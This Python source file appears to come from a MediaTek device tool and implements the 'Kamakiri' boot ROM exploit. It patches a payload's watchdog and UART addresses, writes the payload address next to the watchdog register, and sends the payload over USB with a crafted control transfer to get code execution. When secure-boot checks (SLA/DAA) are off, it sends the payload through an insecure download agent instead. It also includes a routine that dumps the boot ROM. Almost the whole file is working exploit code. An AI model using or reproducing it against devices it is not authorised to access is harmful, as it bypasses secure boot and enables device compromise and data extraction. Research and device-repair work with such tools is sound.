import logging
import os
from struct import pack, unpack
from Library.utils import LogBase, print_progress, revdword
from Library.usblib import usb


class Kamakiri(metaclass=LogBase):
    def __init__(self, mtk, loglevel=logging.INFO):
        self.__logger = self.__logger
        self.lasterror = ""
        self.mtk = mtk
        self.chipconfig = self.mtk.config.chipconfig
        self.var1 = self.chipconfig.var1
        self.info = self.__logger.info
        self.error = self.__logger.error
        self.warning = self.__logger.warning
        if loglevel == logging.DEBUG:
            logfilename = "log.txt"
            if os.path.exists(logfilename):
                os.remove(logfilename)
            fh = logging.FileHandler(logfilename)
            self.__logger.addHandler(fh)
            self.__logger.setLevel(logging.DEBUG)
        else:
            self.__logger.setLevel(logging.INFO)

    def fix_payload(self, payload, da=True):
            payload = bytearray(payload)
            wd = unpack("<I", payload[-4:])[0]
            ua = unpack("<I", payload[-8:-4])[0]
            if wd == 0x10007000:
                payload[-4:] = pack("<I", self.chipconfig.watchdog)
            if ua == 0x11002000:
                payload[-8:-4] = pack("<I", self.chipconfig.uart)
            while len(payload) % 4 != 0:
                payload.append(0)
            if da:
                payload.extend(b"\x00" * 0x100)  # signature len
            return payload

    def exploit(self, payload, payloadaddr):
        addr = self.mtk.config.chipconfig.watchdog + 0x50
        self.mtk.preloader.write32(addr, [revdword(payloadaddr)])
        for i in range(0, 0xF):
            self.mtk.preloader.read32(addr - (0xF - i) * 4, 0xF - i + 1)
        self.mtk.port.echo(b"\xE0")
        self.mtk.port.echo(pack(">I", len(payload)))
        status = int.from_bytes(self.mtk.port.usbread(2), byteorder="little")
        if status:
            raise Exception("Kamakiri Payload is too large")
        self.mtk.port.usbwrite(payload)
        self.mtk.port.usbread(2)
        self.mtk.port.usbread(2)

        # noinspection PyProtectedMember
        udev = usb.core.find(idVendor=0x0E8D, idProduct=0x3)
        try:
            # noinspection PyProtectedMember
            udev._ctx.managed_claim_interface = lambda *args, **kwargs: None
        except AttributeError as e:
            raise RuntimeError("libusb is not installed for port {}".format(udev.dev.port)) from e

        try:
            udev.ctrl_transfer(0xA1, 0, 0, self.var1, 0)
        except usb.core.USBError as e:
            print(e)
            self.lasterror = str(e)
            del udev
        return True

    def payload(self, payload, addr, forcekamakiri=True):
        if self.mtk.config.target_config["sla"] or self.mtk.config.target_config["daa"] or forcekamakiri:
            payload = self.fix_payload(payload, False)
            self.info("Trying kamakiri..")
            if self.exploit(payload, addr):
                self.info("Done sending payload...")
                return True
        else:
            self.info("Sending payload via insecure da.")
            payload = self.fix_payload(payload, True)
            if self.mtk.preloader.send_da(addr, len(payload) - 0x100, 0x100, payload):
                if self.mtk.preloader.jump_da(addr):
                    self.info("Done sending payload...")
                    return True
        self.error("Error on sending payload.")
        return False

    def dump_brom(self, filename):
        old = 0
        try:
            with open(filename, 'wb') as wf:
                print_progress(0, 100, prefix='Progress:', suffix='Complete', bar_length=50)
                for addr in range(0x0, 0x20000, 16):
                    prog = int(addr / 0x20000 * 100)
                    if round(prog, 1) > old:
                        print_progress(prog, 100, prefix='Progress:', suffix='Complete, addr %08X' % addr,
                                       bar_length=50)
                        old = round(prog, 1)
                    wf.write(self.mtk.port.usbread(16))
                print_progress(100, 100, prefix='Progress:', suffix='Complete', bar_length=50)
                return True
        except Exception as e:
            self.error(f"Error on opening {filename} for writing: {str(e)}")
            return False
